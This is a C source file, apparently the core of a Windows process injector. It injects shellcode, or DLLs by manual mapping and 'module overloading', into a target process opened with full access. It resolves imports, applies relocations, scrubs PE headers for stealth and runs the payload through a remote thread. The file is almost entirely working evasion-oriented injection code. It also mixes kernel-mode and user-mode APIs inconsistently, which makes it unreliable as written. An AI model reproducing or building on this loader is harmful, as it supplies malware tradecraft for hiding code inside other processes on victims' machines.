/*
 * Injector Core - Main Integration
 *
 * Complete injection workflow combining all Phase 1 components.
 */

#include "InjectorCore.h"
#include "TypeDefinitions.h"
#include "Constants.h"
#include <ntifs.h>

NTSTATUS InitializeInjectorCore(
    OUT PINJECTOR_CORE_CONTEXT Context,
    IN ULONG TargetProcessId,
    IN INJECTION_METHOD Method
)
{
    NTSTATUS Status;
    HANDLE ProcessHandle;

    if (Context == NULL || TargetProcessId == 0) {
        return STATUS_INVALID_PARAMETER;
    }

    RtlZeroMemory(Context, sizeof(INJECTOR_CORE_CONTEXT));
    Context->Tag = INJECTOR_CORE_TAG;
    Context->TargetProcessId = TargetProcessId;
    Context->Method = Method;

    // Open target process
    ProcessHandle = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        TargetProcessId
    );

    if (ProcessHandle == NULL) {
        return STATUS_ACCESS_DENIED;
    }

    Context->TargetProcess = ProcessHandle;

    // Initialize import resolver
    Status = InitializeImportResolver(&Context->ImportResolver);
    if (!NT_SUCCESS(Status)) {
        CloseHandle(ProcessHandle);
        return Status;
    }

    // Initialize thread executor
    Status = InitializeThreadExecutor(&Context->ThreadExecutor, ProcessHandle);
    if (!NT_SUCCESS(Status)) {
        CleanupImportResolver(&Context->ImportResolver);
        CloseHandle(ProcessHandle);
        return Status;
    }

    // Initialize shellcode loader
    Status = InitializeShellcodeLoader(&Context->ShellcodeLoader, ProcessHandle);
    if (!NT_SUCCESS(Status)) {
        CleanupThreadExecutor(&Context->ThreadExecutor);
        CleanupImportResolver(&Context->ImportResolver);
        CloseHandle(ProcessHandle);
        return Status;
    }

    // Initialize module overloading if needed
    if (Method == InjectionMethodModuleOverloading) {
        Status = InitializeModuleOverloading(&Context->ModuleOverloading);
        if (!NT_SUCCESS(Status)) {
            CleanupShellcodeLoader(&Context->ShellcodeLoader);
            CleanupThreadExecutor(&Context->ThreadExecutor);
            CleanupImportResolver(&Context->ImportResolver);
            CloseHandle(ProcessHandle);
            return Status;
        }
    }

    Context->Initialized = TRUE;
    return STATUS_SUCCESS;
}

NTSTATUS InjectDll(
    IN PINJECTOR_CORE_CONTEXT Context,
    IN PVOID DllBuffer,
    IN SIZE_T DllSize,
    OUT PHANDLE ThreadHandle OPTIONAL
)
{
    NTSTATUS Status;

    if (Context == NULL || !Context->Initialized || DllBuffer == NULL || DllSize == 0) {
        return STATUS_INVALID_PARAMETER;
    }

    switch (Context->Method) {
        case InjectionMethodModuleOverloading:
            Status = InjectViaModuleOverloading(Context, DllBuffer, DllSize, ThreadHandle);
            break;

        case InjectionMethodManualMap:
            Status = InjectViaManualMap(Context, DllBuffer, DllSize, ThreadHandle);
            break;

        default:
            Status = STATUS_NOT_IMPLEMENTED;
            break;
    }

    if (NT_SUCCESS(Status)) {
        Context->TotalInjections++;
        Context->LastInjectionTime = KeQuerySystemTimePrecise();
    }
    else {
        Context->LastError = Status;
    }

    return Status;
}

NTSTATUS InjectShellcode(
    IN PINJECTOR_CORE_CONTEXT Context,
    IN PVOID Shellcode,
    IN SIZE_T ShellcodeSize,
    IN PVOID Parameter OPTIONAL,
    OUT PHANDLE ThreadHandle OPTIONAL
)
{
    NTSTATUS Status;
    SHELLCODE_ENTRY Entry;

    if (Context == NULL || !Context->Initialized || Shellcode == NULL || ShellcodeSize == 0) {
        return STATUS_INVALID_PARAMETER;
    }

    // Prepare shellcode
    Status = PrepareShellcode(
        &Context->ShellcodeLoader,
        Shellcode,
        ShellcodeSize,
        &Entry
    );

    if (!NT_SUCCESS(Status)) {
        return Status;
    }

    // Execute via thread
    Status = ExecutePayloadViaThread(
        &Context->ThreadExecutor,
        Entry.EntryPoint,
        Parameter,
        ThreadHandle
    );

    if (NT_SUCCESS(Status)) {
        Context->InjectedImageBase = Entry.ShellcodeAddress;
        Context->InjectedImageSize = Entry.ShellcodeSize;
        Context->InjectedEntryPoint = Entry.EntryPoint;
        Context->TotalInjections++;
        Context->LastInjectionTime = KeQuerySystemTimePrecise();
    }
    else {
        UnloadShellcode(&Context->ShellcodeLoader, &Entry);
        Context->LastError = Status;
    }

    return Status;
}

NTSTATUS InjectViaModuleOverloading(
    IN PINJECTOR_CORE_CONTEXT Context,
    IN PVOID DllBuffer,
    IN SIZE_T DllSize,
    OUT PHANDLE ThreadHandle OPTIONAL
)
{
    NTSTATUS Status;
    PIMAGE_DOS_HEADER DosHeader;
    PIMAGE_NT_HEADERS NtHeaders;
    UNICODE_STRING DllPath;
    SIZE_T SacrificialDllSize;
    SHELLCODE_ENTRY Entry;

    // Step 1: Select and load sacrificial DLL
    Status = SelectSacrificialDll(
        &Context->ModuleOverloading,
        &DllPath,
        &SacrificialDllSize
    );

    if (!NT_SUCCESS(Status)) {
        return Status;
    }

    Status = LoadSacrificialDll(
        &Context->ModuleOverloading,
        &DllPath
    );

    if (!NT_SUCCESS(Status)) {
        return Status;
    }

    // Step 2: Validate MEM_IMAGE entry
    if (!ValidateMemImageEntry(&Context->ModuleOverloading)) {
        return STATUS_UNSUCCESSFUL;
    }

    // Step 3: Parse target DLL
    DosHeader = (PIMAGE_DOS_HEADER)DllBuffer;
    if (DosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    NtHeaders = (PIMAGE_NT_HEADERS)((PUCHAR)DllBuffer + DosHeader->e_lfanew);
    if (NtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    // Step 4: Load DLL as shellcode (manual map)
    Status = LoadDllShellcode(
        &Context->ShellcodeLoader,
        DllBuffer,
        DllSize,
        &Entry
    );

    if (!NT_SUCCESS(Status)) {
        return Status;
    }

    // Step 5: Resolve imports
    Status = ResolveImportTable(
        &Context->ImportResolver,
        Entry.ShellcodeAddress,
        NtHeaders
    );

    if (!NT_SUCCESS(Status)) {
        UnloadShellcode(&Context->ShellcodeLoader, &Entry);
        return Status;
    }

    // Step 6: Apply relocations
    ULONG RelocationCount;
    Status = ParseBaseRelocationTable(
        &Context->ModuleOverloading,
        &RelocationCount
    );

    if (NT_SUCCESS(Status) && RelocationCount > 0) {
        ULONGLONG Delta = (ULONGLONG)Entry.ShellcodeAddress -
                          NtHeaders->OptionalHeader.ImageBase;
        Status = ApplyBaseRelocations(&Context->ModuleOverloading, Delta);
    }

    if (!NT_SUCCESS(Status)) {
        UnloadShellcode(&Context->ShellcodeLoader, &Entry);
        return Status;
    }

    // Step 7: Scrub headers for stealth
    Status = PerformHeaderScrubbing(&Context->ModuleOverloading);
    if (!NT_SUCCESS(Status)) {
        // Non-fatal, continue
    }

    // Step 8: Execute entry point
    Status = ExecutePayloadViaThread(
        &Context->ThreadExecutor,
        Entry.EntryPoint,
        Entry.ShellcodeAddress,  // DllMain receives HINSTANCE
        ThreadHandle
    );

    if (NT_SUCCESS(Status)) {
        Context->InjectedImageBase = Entry.ShellcodeAddress;
        Context->InjectedImageSize = Entry.ShellcodeSize;
        Context->InjectedEntryPoint = Entry.EntryPoint;
        if (ThreadHandle != NULL) {
            Context->ExecutionThread = *ThreadHandle;
        }
    }
    else {
        UnloadShellcode(&Context->ShellcodeLoader, &Entry);
    }

    return Status;
}

NTSTATUS InjectViaManualMap(
    IN PINJECTOR_CORE_CONTEXT Context,
    IN PVOID DllBuffer,
    IN SIZE_T DllSize,
    OUT PHANDLE ThreadHandle OPTIONAL
)
{
    NTSTATUS Status;
    PIMAGE_DOS_HEADER DosHeader;
    PIMAGE_NT_HEADERS NtHeaders;
    SHELLCODE_ENTRY Entry;

    // Parse PE
    DosHeader = (PIMAGE_DOS_HEADER)DllBuffer;
    if (DosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    NtHeaders = (PIMAGE_NT_HEADERS)((PUCHAR)DllBuffer + DosHeader->e_lfanew);
    if (NtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    // Load DLL
    Status = LoadDllShellcode(
        &Context->ShellcodeLoader,
        DllBuffer,
        DllSize,
        &Entry
    );

    if (!NT_SUCCESS(Status)) {
        return Status;
    }

    // Resolve imports
    Status = ResolveImportTable(
        &Context->ImportResolver,
        Entry.ShellcodeAddress,
        NtHeaders
    );

    if (!NT_SUCCESS(Status)) {
        UnloadShellcode(&Context->ShellcodeLoader, &Entry);
        return Status;
    }

    // Execute
    Status = ExecutePayloadViaThread(
        &Context->ThreadExecutor,
        Entry.EntryPoint,
        Entry.ShellcodeAddress,
        ThreadHandle
    );

    if (NT_SUCCESS(Status)) {
        Context->InjectedImageBase = Entry.ShellcodeAddress;
        Context->InjectedImageSize = Entry.ShellcodeSize;
        Context->InjectedEntryPoint = Entry.EntryPoint;
        if (ThreadHandle != NULL) {
            Context->ExecutionThread = *ThreadHandle;
        }
    }
    else {
        UnloadShellcode(&Context->ShellcodeLoader, &Entry);
    }

    return Status;
}

NTSTATUS WaitForInjectionCompletion(
    IN PINJECTOR_CORE_CONTEXT Context,
    IN ULONG TimeoutMs,
    OUT PULONG ExitCode OPTIONAL
)
{
    if (Context == NULL || Context->ExecutionThread == NULL) {
        return STATUS_INVALID_PARAMETER;
    }

    return WaitForThreadCompletion(
        Context->ExecutionThread,
        TimeoutMs,
        ExitCode
    );
}

VOID CleanupInjectorCore(IN PINJECTOR_CORE_CONTEXT Context)
{
    if (Context == NULL) {
        return;
    }

    if (Context->ExecutionThread != NULL) {
        CloseHandle(Context->ExecutionThread);
    }

    CleanupShellcodeLoader(&Context->ShellcodeLoader);
    CleanupThreadExecutor(&Context->ThreadExecutor);
    CleanupImportResolver(&Context->ImportResolver);
    CleanupModuleOverloading(&Context->ModuleOverloading);

    if (Context->TargetProcess != NULL) {
        CloseHandle(Context->TargetProcess);
    }

    RtlZeroMemory(Context, sizeof(INJECTOR_CORE_CONTEXT));
}
